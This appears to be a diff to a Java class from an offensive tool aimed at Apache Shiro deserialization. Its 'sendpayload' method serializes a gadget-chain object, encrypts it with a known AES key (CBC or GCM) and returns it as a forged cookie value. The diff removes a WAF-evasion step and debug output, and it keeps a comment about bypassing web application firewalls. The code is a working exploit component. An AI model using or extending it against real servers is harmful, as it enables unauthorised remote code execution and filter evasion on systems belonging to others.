@@ -60,37 +60,15 @@ public class Shiro implements FramePayload {
     @Override
     public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
         byte[] serpayload = SerializableUtils.toByteArray(chainObject);
-        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
-        byte[] encryptpayload = null;
-//        byte[] encryptpayload;
         if (AttackService.aesGcmCipherType == 1) {
-//            CipherService cipherService = new AesCipherService();
-//            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
-//            encryptpayload = byteSource.getBytes();
-//            GcmEncrypt gcmEncrypt = new GcmEncrypt();
             ShiroGCM shiroGCM = new ShiroGCM();
-            String byteSource = shiroGCM.encrypt(key,serpayload);
-//            String byteSource = gcmEncrypt.encrypt(key, serpayload);
-//            encryptpayload = byteSource.getBytes();
-            byteSource = insertSpecialChars(byteSource);
-            System.out.println(shiroKeyWord + "=" + byteSource);
+            String byteSource = shiroGCM.encrypt(key, serpayload);
             return shiroKeyWord + "=" + byteSource;
-
         } else {
-            System.out.println("sendPayload");
-//            encryptpayload = AesUtil.encrypt(serpayload, bkey);
             CbcEncrypt cbcEncrypt = new CbcEncrypt();
             String byteSource = cbcEncrypt.encrypt(key, serpayload);
-            byteSource = insertSpecialChars(byteSource);
-            System.out.println(byteSource);
-            System.out.println(shiroKeyWord + "=" + byteSource);
             return shiroKeyWord + "=" + byteSource;
         }
-
-//增加绕waf的方法，暂不开启。by @by3 @liuwa
-        //return shiroKeyWord +  "=" +"...." + DatatypeConverter.printBase64Binary(encryptpayload);
-//		return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
-
     }
 //    @Override
 //    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
